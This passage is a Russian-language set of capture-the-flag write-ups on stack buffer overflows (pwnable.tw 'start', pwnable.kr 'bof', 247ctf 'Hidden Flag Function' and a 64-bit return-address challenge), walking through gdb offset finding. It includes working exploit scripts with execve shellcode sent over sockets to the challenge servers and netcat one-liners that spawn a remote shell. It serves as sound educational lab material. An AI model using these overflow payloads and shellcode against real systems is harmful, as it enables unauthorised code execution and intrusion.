Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
```

### Поиск смещений

![[Pasted image 20230602033026.png]]

Полученный адрес ничего не дал

![[Pasted image 20230602033050.png]]

Посмотрим что это за адрес в памяти  
  
```
x/x 0x000000000040068e
```

![[Pasted image 20230602033122.png]]

Видно что этот адрес , есть в главной функции.  
  
Посмотрим...  
  
```
disas main
```

![[Pasted image 20230602033145.png]]

Это адрес возврата из главной функции. И это значение находится в регистре RIP (EIP). Значит мы перезаписали всё! Но как узнать конкретное значение? Давайте посмотрим на регистры  
  
```
i r
```

![[Pasted image 20230602033213.png]]

Как и всегда нас интересуют 3 регистра:

```
rbp            0x41326a41316a4130       0x41326a41316a4130
rsp            0x7fffaf1af7c8   0x7fffaf1af7c8
rip            0x40068e 0x40068e <main+102>
```

- **RIP**    указывает на текущую инструкцию там у нас адрес возврата из главной функции  
- **RSP**   на верхушку стека  
- **RBP**   относительного него записываются локальные переменные и аргументы в стеке  

Тут видно что RBP перезаписан посмотрим...

![[Pasted image 20230602033307.png]]

А вот и смещение - 272 байта. Проверим так ли это...

![[Pasted image 20230602033338.png]]

Нет это не так. 272 байта не перезаписывают RBP. Тогда добавим еще 8 байт ( так как это 64 ) и проверим снова. Как видно на скриншоте 280 это смещение которое мы искали. Теперь составим сам эксплойт.

### Создание полезной нагрузки
  
```python
python -c 'print "A"*280 + "\xe7\x05\x40\x00\x00\x00\x00\x00" ' > /tmp/exploit
  
(cat /tmp/exploit; cat) | ./ch35
```

Запускаем и получаем заветный флаг.

![[Pasted image 20230602033505.png]]

Вот так вот можно было получить флаг.

В python3:

```python
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*280 + b"\xe7\x05\x40\x00\x00\x00\x00\x00")' > /tmp/exploit

(cat /tmp/exploit; cat) | ./ch35
```


---

## start

Платформа: https://pwnable.tw/
**Уровень:** Easy

Это рецензия на начало испытания от [pwnable.tw](http://pwnable.tw) . Это самая первая задача на веб-сайте, и, если уж на то пошло, простая. Существует простое переполнение буфера в двоичном файле, но нет гаджета jmp to esp, поэтому нам нужно создать цепочку rop, чтобы найти адрес esp, а затем перейти к нему, чтобы заставить двоичный файл выполнить наш шеллкод.

Как говорится, приступим.

### Анализ двоичного файла

Мы можем скачать бинарник с сайта и закинуть его в gdb, чтобы рассмотреть поближе.

```c
gdb ./start

gef➤  info fun
All defined functions:

Non-debugging symbols:
0x08048060  _start
0x0804809d  _exit
0x080490a3  __bss_start
0x080490a3  _edata
0x080490a4  _end
gef➤  checksec
[+] checksec for '/home/duckie/Documents/pwnable.tw/start/start'
Canary                        : ✘
NX                            : ✘
PIE                           : ✘
Fortify                       : ✘
RelRO                         : ✘
```

Бинарный файл небольшой и не имеет в себе главного, я бы сказал, что он создан вручную для этой задачи. Таким образом, изменить его должно быть довольно легко. Начнем с **функции _start** .

```c
gef➤  disas _start
Dump of assembler code for function _start:
   0x08048060 <+0>:     push   esp
   0x08048061 <+1>:     push   0x804809d
   0x08048066 <+6>:     xor    eax,eax
   0x08048068 <+8>:     xor    ebx,ebx
   0x0804806a <+10>:    xor    ecx,ecx
   0x0804806c <+12>:    xor    edx,edx
   0x0804806e <+14>:    push   0x3a465443
   0x08048073 <+19>:    push   0x20656874
   0x08048078 <+24>:    push   0x20747261
   0x0804807d <+29>:    push   0x74732073
   0x08048082 <+34>:    push   0x2774654c
   0x08048087 <+39>:    mov    ecx,esp
   0x08048089 <+41>:    mov    dl,0x14
   0x0804808b <+43>:    mov    bl,0x1
   0x0804808d <+45>:    mov    al,0x4
   0x0804808f <+47>:    int    0x80
   0x08048091 <+49>:    xor    ebx,ebx
   0x08048093 <+51>:    mov    dl,0x3c
   0x08048095 <+53>:    mov    al,0x3
   0x08048097 <+55>:    int    0x80
   0x08048099 <+57>:    add    esp,0x14
   0x0804809c <+60>:    ret
End of assembler dump.
```

Глядя на asm, мы видим, что всего 2 системных вызова (т.е. int 0x80) в одном al (т.е. младшие 8 битов eax) - 0x4 (т.е. запись), а в другом - 0x3 (чтение). Начнем разбираться с ассемблерной инструкцией за инструкцией.

1. Сначала запихиваем esp в стек
2. Нажимаем адрес 0x804809d (адрес функции _exit)
3. Обнуление регистров eax,ebx,ecx,edx.
4. Поместите в стек строку «Давайте запустим CTF:» в формате endian.
5. переместите адрес esp в ecx и другие вещи, необходимые для системного вызова записи.
6. наконец системный вызов
7. настройка вещей req для чтения системного вызова
8. затем системный вызов чтения со значением edx 0x3c (т.е. 60).
### Создание шаблона 

Так ведь я думаю скрипт этой проги подскажет пользователю ввод 20 байт, после он прочитает 60 байт. Похоже, у нас есть уязвимость переполнения буфера. Давайте попробуем, задав очень длинную строку, чтобы найти смещение.

```c
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[+] Saved as '$_gef0'
```

### Поиск смещений

```c
gef➤  r
Starting program: /home/duckie/Documents/pwnable.tw/start/start
Let's start the CTF:aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x61616166 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]


$eax   : 0x3c
$ebx   : 0x0
$ecx   : 0xffffd154  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$edx   : 0x3c
$esp   : 0xffffd16c  →  0x61616167 ("gaaa"?)
$ebp   : 0x0
$esi   : 0x0
$edi   : 0x0
$eip   : 0x61616166 ("faaa"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0000


0xffffd16c│+0x0000: 0x61616167   ← $esp
0xffffd170│+0x0004: 0x61616168
0xffffd174│+0x0008: 0x61616169
0xffffd178│+0x000c: 0x6161616a
0xffffd17c│+0x0010: 0x6161616b
0xffffd180│+0x0014: 0x6161616c
0xffffd184│+0x0018: 0x6161616d
0xffffd188│+0x001c: 0x6161616e


[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616166

[#0] Id 1, Name: "start", stopped 0x61616166 in ?? (), reason: SIGSEGV

gef➤  paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Undefined command: "paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa".  Try "help".

gef➤  pattern search faaa
[+] Searching 'faaa'
[+] Found at offset 17 (little-endian search) likely
[+] Found at offset 20 (big-endian search)
```

Находим смещение на 20. Теперь все, что нам нужно сделать, это найти гаджет для перехода jmp в esp. Поскольку в бинарнике такой инструкции нет, нам нужно будет создать цепочку rop для утечки адреса esp, а затем вручную перейти на esp.

есть **push esp** Внимательно изучив двоичный файл, мы видим, что в его начале **— add esp,0x14** , а в конце **`_start`** .

Прохладный. Таким образом, атака будет заключаться в утечке esp при первом запуске, а затем возврате и передаче полезной нагрузки с шелл-кодом и получении шелла. Нет nx, поэтому шеллкод должен работать. УвУ .

имея это в виду. Мы знаем, что первое, что было помещено в стек, было esp. Итак, после того, как мы дали наш ввод (наш данный ввод перезапишет стек вместо строки «Давайте запустим CTF:») и извлечения 20 байтов данных (с добавлением esp, 0x14) и адреса выхода в _exit **,** мы иметь только esp в стеке. Таким образом, если мы перезапишем eip вызовом write syscall (присутствует в бинарном виде), мы можем утечь адрес **esp** .

После системного вызова записи программа продолжает выполнение и снова запрашивает наш ввод.

Стек будет выглядеть так, когда мы дадим второй ввод.

```c
        |----------------|
        |      esp       |
        |----------------|
        |                |
        |   Our input    | 
        |                |
esp =>  |----------------|
        |  eip overwrite |
        |----------------|
        |  shell code    |
        |----------------|
```

Стек растет от высокого к низкому. esp указывает на вершину стека. Теперь, когда мы добавим 0x14 (т.е. 20) в наш esp, esp будет указывать на запуск шеллкода. Таким образом, мы будем использовать eip с esp+20, чтобы eip напрямую попадал в шеллкод, и у нас была оболочка.

### Создания полезной нагрузки

Таким образом, эксплойт будет выглядеть так:

```python
from pwn import *


padding = b'i'*20

payload = padding + p32(0x08048087)

p = remote('chall.pwnable.tw',10000)

print(p.recvuntil(':'))
p.send(payload)
tmp = p.recv()
esp = u32(tmp[:4])

log.success("found esp")
log.info(hex(esp))

shellcode = b"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x31\xd2\x31\xc9\x31\xd2\x89\xe3\xb0\x0b\xcd\x80\x30\xc0\xfe\xc0\xcd\x80"

payload2 = b'i'*20 + p32(esp+20) + shellcode



p.send(payload2)
p.interactive()
```

```c
global _start


_start:
	push 6845231
	push 1852400175
	xor edx,edx
	xor ecx,ecx
	xor edx,edx
	mov ebx,esp
	mov al,0xb
	int 0x80

	xor al,al
	inc al
	int 0x80
```

Без посторонних библиотек:

```python
import socket
import struct
import threading
import sys

# Параметры подключения
host = 'chall.pwnable.tw'
port = 10000

# Создаем сокет и подключаемся к серверу
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# Получаем данные до символа ':'
data = s.recv(1024)
print(data.decode(errors='ignore'))

# Первый payload
padding = b'i' * 20
payload = padding + struct.pack('<I', 0x08048087)
s.send(payload)

# Получаем ответ и распаковываем адрес
tmp = s.recv(4)
esp = struct.unpack('<I', tmp[:4])[0]
print(f"[+] Found esp: {hex(esp)}")

# Shellcode
shellcode = (
    b"\x68\x2f\x73\x68\x00"  # push   0x68732f
    b"\x68\x2f\x62\x69\x6e"  # push   0x6e69622f
    b"\x31\xd2"              # xor    edx, edx
    b"\x31\xc9"              # xor    ecx, ecx
    b"\x31\xd2"              # xor    edx, edx
    b"\x89\xe3"              # mov    ebx, esp
    b"\xb0\x0b"              # mov    al, 0xb
    b"\xcd\x80"              # int    0x80
    b"\x30\xc0"              # xor    al, al
    b"\xfe\xc0"              # inc    al
    b"\xcd\x80"              # int    0x80
)

# Второй payload
payload2 = b'i' * 20 + struct.pack('<I', esp + 20) + shellcode
s.send(payload2)

# Функция для чтения пользовательского ввода и отправки его на сервер
def send_input(sock):
    while True:
        try:
            user_input = sys.stdin.read(1)
            sock.send(user_input.encode())
        except Exception as e:
            print(f"Error: {e}")
            break

# Создаем и запускаем поток для отправки пользовательского ввода
input_thread = threading.Thread(target=send_input, args=(s,))
input_thread.daemon = True
input_thread.start()

# Основной поток для получения данных из сокета и вывода их на экран
try:
    while True:
        data = s.recv(4096)
        if not data:
            print("Connection closed by remote host")
            break
        print(data.decode(errors='ignore'), end="")
except KeyboardInterrupt:
    print("\nExiting...")
finally:
    s.close()

```

---
## bof

**Платформа:**  https://pwnable.kr
**Уровень:** Easy

**Описание:**  Нана сказала мне, что переполнение буфера - одна из самых распространенных уязвимостей программного обеспечения.
Это правда?

![[Pasted image 20240615014647.png]]

Все довольно просто: у нас есть уязвимый двоичный файл, его исходный код и порт, на котором он работает.

![[Pasted image 20240615014811.png]]

### Анализ кода

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}

int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

Программа запускает функцию, `func` которой присваивается параметру `key` значение «0xdeadbeef». Что делает функция? Функция `func()` принимает переменную в качестве параметра с именем `key`**_и_** начинает с создания переменной с именем, `overflow me`которая представляет собой не что иное, как строку длиной 32 байта, затем выводит « `overflow me :`» на консоль и получает ввод от пользователя с помощью `gets()`функции. После этого он сравнивает `key`переменную со значением `0xcafebabe`**_,_** если значение `key` равно `0xcafebabe` (в данном случае это не так), то он порождает оболочку, в противном случае он просто выводит « `Nah..`» на консоль и затем завершает работу.  Итак у нас есть функция `main` который запускает `func`  у него есть массив символов (наш буфер), он выводит «переполнение меня:», вызывает `gets` и затем сравнивает `key` (сейчас это 0xdeadbeef) с 0xcafebabe. 

Итак, нам нужно каким-то образом изменить значение `key`. Но как?

### Выявления уязвимости в исходном коде

**gets()**

Если мы введем man gets (LOL), то появится описание функции gets:

```
Функция gets() эквивалентна функции fgets() с бесконечным размером и потоком stdin, за исключением того, что символ новой строки
(если таковой имеется) не сохраняется в строке.  Вызывающий абонент несет ответственность за то, чтобы строка ввода, если таковая имеется, была достаточно короткой, чтобы поместиться в строке.
```

Итак, `gets` это небезопасная версия `fgets`,  потому что она не проверяет размер входных данных.

Переменные помещаются в стек таким образом, что ранее определенные переменные в коде располагаются в памяти последними (стек растет вверх). Таким образом, если локальная переменная `key` находится в памяти после `overflowme`, мы можем продолжать запись `overflowme` достаточно долго, чтобы перезаписать `key` ее нашим специальным сообщением («cafebabe»).
### Исследование двоичного файла

Во-первых, давайте запустим двоичный файл и дадим ему простую строку, чтобы увидеть, что произойдет:

![[Pasted image 20240617012907.png]]

![[Pasted image 20240617012920.png]]

и мы получили сообщение «Нет…», теперь давайте попробуем запустить его еще раз, но на этот раз я дам ему более длинную строку, чтобы посмотреть, что произойдет ;)

![[Pasted image 20240617012952.png]]

![[Pasted image 20240617012959.png]]

И мы получили сообщение «***обнаружено разрушение стека***», а затем двоичный файл разбился.

**Здесь важно отметить:** мы не хотим знать смещение или место, где именно происходит сбой программы. Это потому, что нам не нужно перезаписывать `EIP`, нам нужно перезаписать значение переменной, которая находится в стеке. Таким образом, предоставление программе шаблона и поиск смещения не помогут, потому что нам нужно знать, где в стеке находится значение `0xdeadbeef`.

Теперь пришло время `gdb`. Я запустил `gdb`и установил точку останова в начале функции `main`( `break main`), затем запустил программу с помощью`run`:

![[Pasted image 20240617013859.png]]

Она остановилась на точке останова. Нам нужно дизассемблировать функцию `func()`, чтобы получить адрес инструкции сравнения, которая сравнивает значения `key`, и `0xcafebabe`установить там другую точку останова, и посмотреть на стек:

![[Pasted image 20240617014146.png]]

Мы видим инструкцию [`cmpl`(Сравнить логику)](https://www.ibm.com/support/knowledgecenter/en/ssw_aix_72/com.ibm.aix.alangref/idalangref_comp_logical_inst.htm) по адресу `0x0000654`:

```
0x80000654 <+40>: cmpl $0xcafebabe,0x8(%ebp)
```

Давайте установим точку останова непосредственно перед ней:

![[Pasted image 20240617014303.png]]

Теперь продолжим выполнение (`c`) и дождемся нашей точки останова:

![[Pasted image 20240617014523.png]]

Или если установили две точки останови, то запустим программу с помощью команды `run` и продолжим выполнение командой `continue`:

![[Pasted image 20240617021135.png]]

Я дал ему краткий ввод, потому что нам не нужно разбивать его и перезаписывать данные в стеке, нам просто нужно просмотреть стек во время обычного выполнения, чтобы найти `0xdeadbeef`.

После достижения второй точки останова давайте посмотрим на стек:  

```
x/50wx $esp
```

![[Pasted image 20240617021455.png]]

**Первый способ вычислений** 

`0xdeadbeef` появляется в первой строке перед `0xbffff2e0`, а наши входные данные начинают отображаться в последней строке перед `0xbffff2a0`. Мы можем легко определить расстояние между нашими входными данными и `0xdeadbeef`, каждое шестнадцатеричное значение представляет 4 символа (0x41414141 == AAAA), и у нас есть ровно 13 из них перед 0xdeadbeef (1 + 4 + 4 + 4).

```
13 * 4 = 52
``` 

**Второй способ вычисления расстояний**: Вычисление с п.м. абсолютного адреса 

Но удобнее всего вычислить расстояние можно с п.м. адресов. Начало буфера находится в конце `2a0` по смещению `0x2a0+ac`, а наша цель расположена по адресу `2e0`. И выходит:

```python
hex(0x2e0-0x2a0-int(12)) #0x34
```

```
0x34 = 52
```

**Чтобы вы понимали:** Число 12 в нашем вычислений - это (4 * 3, три четрыхбайтных рядов) конец `2a0`, мы исключили первые 12 байтов потому что, начало нашего буфера находится в конце `2a0` (в четвёртом ряду четырёхбайтного ряда), то есть это конец `2a0`. 

Выходит наш буфер расположен по адресу:

```python
hex(0x2a0+int(12)) # 0x2ac
```

Проверим смещенеие:

```python
hex(0x2e0-0x2ac) #0x34
```

```
0x34 = int(52)
```

Всё правильно! \

Давайте проверим значения по указанному адресу:

```
x/20x 0x2ac
```

Мы получим данные которые были записаны в буфер.

**Третий способ вычисления расстояний**: Вычисление c п.м. относительного адреса 

**Получения фактического адреса** 

Мы можем распечатать содержимое `$ebp+8`:

```
(gdb) x $ebp+8
0xbffff2e0:    0xdeadbeef
```

- `x $ebp+8`: Команда `x` используется в `gdb` для просмотра содержимого памяти. В данном случае:
    
    - `x` без указания конкретного формата выводит содержимое памяти в шестнадцатеричном формате.
    - `$ebp+8` — это адрес памяти, который необходимо просмотреть. Адрес вычисляется как текущий базовый указатель кадра стека `ebp` плюс 8 байт.
- `0xbffff2e0`: Это фактический адрес в памяти, который был вычислен как `$ebp + 8`. Адрес находится в стеке, который часто использует адреса из области, близкой к верхней части пространства памяти, на современных системах, особенно на архитектуре x86.
    
- `0xdeadbeef`: Это значение, которое хранится по указанному адресу в памяти. В шестнадцатеричной системе это выглядит как `0xdeadbeef`.

**Анализ**

   **Смещение от ebp**

- Смещение `+8` от `ebp` обычно указывает на позицию в стеке, которая соответствует второму аргументу функции в стандартном соглашении вызова `cdecl` на x86. Вызов функции сохраняет свои параметры относительно базового указателя стека. Например, `+4` будет адресом возврата, а `+8` — первым параметром, `+12` — вторым параметром и т.д.

Наш `key` адрес (в моем случае) `0xbffff2e0`. Далее нам нужно найти, где начинается буфер, чтобы мы знали расстояние между ними. Если мы запишем в буфер такое количество байтов и закончим на «cafebabe», наше новое значение перезапишет «deadbeef», и мы захватим наш флаг. Иногда чтобы найти адрес буфера нам не нужно много мучаться. Мы знаем, что ранее deadbeef был скопирован в eax.  Здесь мы видим инструкцию по сборке “загрузить эффективный адрес” (lea):

```
0x56555649 <func+001d>      lea    eax, [ebp-0x2c]
```

Если мы хотим проверить `$ebp-0x2c`, мы можем ввести

```
(gdb) x/1s $ebp-0x2c
0xffffcd7c:  "AAAAAAAAAAAAA"
```

`ebp-0x2c` обозначает относительное смещение на 0x2c (или 44 в десятичной системе) от адреса, хранящегося в регистре ebp. В ассемблерном языке это указывает на доступ к данным или переменной, которая находится на определенном смещении от базового указателя стека ebp. 

Как можно заметить, по относительному адресу `ebp-0x2c` находится наш буфер с адресом `0xffffcd7c`. Другими словами, Результат показывает, что память, начиная с адреса 0xffffcd7c содержит строку "AAAAAAAAAAAAA". Значит, похоже, что в данной области памяти хранится строка из символов 'A'. 

- `x/1s $ebp-0x2c`: Команда `x` в `gdb` используется для просмотра содержимого памяти. Здесь она указана с опциями:
    
    - `1s` означает, что будет выведена одна строка (`s`) символов.
    - `$ebp-0x2c` указывает на адрес памяти, который нужно прочитать. Адрес вычисляется как `текущий базовый указатель стека (ebp)` минус `0x2c` (44 в десятичной системе).
- `0xffffcd7c`: Это фактический адрес в памяти, на который ссылается выражение `$ebp-0x2c`. Значения адресов в стеке часто находятся в пределах близких значений, особенно если стек использует значительную часть памяти.
    
- `"AAAAAAAAAAAAA"`: Это содержимое по указанному адресу, интерпретированное как строка символов. В данном случае это последовательность символов `A`.

**Анализ:**

- **Смещение от `ebp`**: В данном примере указано смещение `-0x2c` от базового указателя стека `ebp`. Обычно это значит, что содержимое, на которое ссылается указатель, находится ниже текущего значения `ebp` на 44 байта в памяти. Это может быть участок памяти, зарезервированный для локальных переменных, промежуточных данных или буферов.
    
- **Содержимое `AAAAAAAAAAAAA`**: Последовательность `A` часто используется для тестирования буферов, обнаружения переполнения буфера или других уязвимостей в коде. В контексте отладки, если видна такая строка, возможно, что эта память была заполнена для проверки или что произошло переполнение буфера.

2. **Вычисления расстояний** 

```python
hex(0xffffcdb0-0xffffcd7c) #0x34 = 52
```

### Создания полезной нагрузки

Как вы можете видеть, `0xdeadbeef`появляется в строке сразу после `0xffffcef0`, а наши входные данные появляются в последней строке перед `0xffffceb0`, теперь нам нужно вычислить расстояние между нашими входными данными и `0xdeadbeef`перезаписать их значением ключа, чтобы создать оболочку, и как вы можете видите, у нас есть 52 байта (начиная с последней строки перед `0xffffceb0`до строки, в которой `0xdeadbeef`хранится) для заполнения, пока мы не доберемся до адреса, где `0xdeadbeef`хранится, чтобы перезаписать его, поэтому я собираюсь использовать Python `pwntools`для создания эксплойта и создания оболочка.

```bash
$ (python -c "print '\x01'*52+'\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
cat flag
daddy, I just pwned a buFFer :)
```

На python3:

```python
(python3 -c "import struct;import sys;payload=struct.pack('I',0xcafebabe);sys.stdout.buffer.write(b'A'*52+payload)"; cat) | nc pwnable.kr 9000
```

![[Pasted image 20240617025627.png]]

Одна из замечательных особенностей `pwntools`— это простота, в сочетании с простотой этого эксплойта, он состоит всего из 4 строк кода.

```python
#!/usr/bin/python
from pwn import *

payload = 'A' * 52 + '\xbe\xba\xfe\xca'
shell = remote('pwnable.kr',9000)
shell.send(payload)
shell.interactive()
```

Довольно простой эксплойт, но он даст нам доступ к оболочке на компьютере, поэтому прочитайте флаг.

![[Pasted image 20240617030248.png]]

И действительно, у нас на коробке ракушка и флаг такой:

```
daddy, I just pwned a buFFer :)`
```


---

## Hidden Flag Function

**Платформа:**  https://247ctf.com/ 
**Уровень:** Easy

### Создание шаблона 

Чтобы увидеть, уязвим ли файл к какому-либо переполнению буфера, самый простой способ — заставить его сломаться. Поэтому нам нужна длинная строка для ввода в качестве входных данных. Чтобы помочь нам в этом, Metasploit содержит хороший инструмент, который создает последовательность уникальных значений. Почему уникальный, спросите вы? Причина кроется в том, что на следующем шаге мы захотим узнать, где именно обрывается выполнение, и использовать эту информацию.

```bash
kali@kali:~$ msf-pattern_create -l 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9
```

Давайте попробуем запустить бинарный файл (убедитесь, что вы всегда делаете это в виртуальной среде, так как мы не можем доверять случайному коду, который мы находим в Интернете):

```bash
kali@kali:~$ ./hidden_flag_function
What do you have to say?
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9
Segmentation fault.
```

Хорошо, мы видим, что нам удалось переполнить буфер и заставить программу сломаться. Теперь мы хотим знать, где именно прерывается программа, для этой задачи мы будем использовать отладчик GNU с расширениями GEF.

### Вычисление смещений

```c
kali@kali:~$ gdb -q ./hidden_flag_function
GEF for linux ready, type `gef' to start, `gef config' to configure
75 commands loaded for GDB 8.3.1 using Python engine 3.7
[*] 5 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./hidden_flag_function...
(No debugging symbols found in ./hidden_flag_function)
gef➤  r
Starting program: /home/kali/hidden_flag_function
What do you have to say?
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x1
$ebx   : 0x33634132 ("2Ac3"?)
$ecx   : 0x0
$edx   : 0xf7fb701c  →  0x00000000
$esp   : 0xffffd580  →  "6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A[...]"
$ebp   : 0x41346341 ("Ac4A"?)
$esi   : 0xf7fb5000  →  0x001d6d6c ("lm"?)
$edi   : 0xf7fb5000  →  0x001d6d6c ("lm"?)
$eip   : 0x63413563 ("c5Ac"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
─────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd580│+0x0000: "6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A[...]"	 ← $esp
0xffffd584│+0x0004: "Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae[...]"
0xffffd588│+0x0008: "c9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5[...]"
0xffffd58c│+0x000c: "0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6A[...]"
0xffffd590│+0x0010: "Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae[...]"
0xffffd594│+0x0014: "d3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9[...]"
0xffffd598│+0x0018: "4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0A[...]"
0xffffd59c│+0x001c: "Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af[...]"
───────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x63413563
───────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "hidden_flag_fun", stopped, reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

`c5Ac`находится на 76-м месте в нашей полезной нагрузке, мы можем посчитать это вручную в нашей сгенерированной последовательности.

Но чтобы избежать ошибок и ускорить счет, мы можем проверить смещение той области памяти, в которой `c5Ac`имеет место:

```bash
kali@kali:~$ msf-pattern_offset -q 0x63413563
[*] Exact match at offset 76
```

### Куда нужно ссылаться

Как следует из двоичного имени, должно быть `flag()`функция где-то в приложении, которую нам нужно выполнить. Чтобы найти его, мы можем использовать `objdump`:

```c
kali@kali:~$ objdump -drwC -Mintel -d hidden_flag_function
...

08048576 <flag>:
 8048576:	55                   	push   ebp
 8048577:	89 e5                	mov    ebp,esp
 8048579:	53                   	push   ebx
 804857a:	83 ec 54             	sub    esp,0x54
 804857d:	e8 2e ff ff ff       	call   80484b0 <__x86.get_pc_thunk.bx>
 8048582:	81 c3 7e 1a 00 00    	add    ebx,0x1a7e
 8048588:	83 ec 08             	sub    esp,0x8
 804858b:	8d 83 e0 e6 ff ff    	lea    eax,[ebx-0x1920]
 8048591:	50                   	push   eax
 8048592:	8d 83 e2 e6 ff ff    	lea    eax,[ebx-0x191e]
 8048598:	50                   	push   eax
 8048599:	e8 92 fe ff ff       	call   8048430 <fopen@plt>
 804859e:	83 c4 10             	add    esp,0x10
 80485a1:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax
 80485a4:	83 ec 04             	sub    esp,0x4
 80485a7:	ff 75 f4             	push   DWORD PTR [ebp-0xc]
 80485aa:	6a 40                	push   0x40
 80485ac:	8d 45 b4             	lea    eax,[ebp-0x4c]
 80485af:	50                   	push   eax
 80485b0:	e8 4b fe ff ff       	call   8048400 <fgets@plt>
 80485b5:	83 c4 10             	add    esp,0x10
 80485b8:	83 ec 08             	sub    esp,0x8
 80485bb:	8d 45 b4             	lea    eax,[ebp-0x4c]
 80485be:	50                   	push   eax
 80485bf:	8d 83 ec e6 ff ff    	lea    eax,[ebx-0x1914]
 80485c5:	50                   	push   eax
 80485c6:	e8 25 fe ff ff       	call   80483f0 <printf@plt>
 80485cb:	83 c4 10             	add    esp,0x10
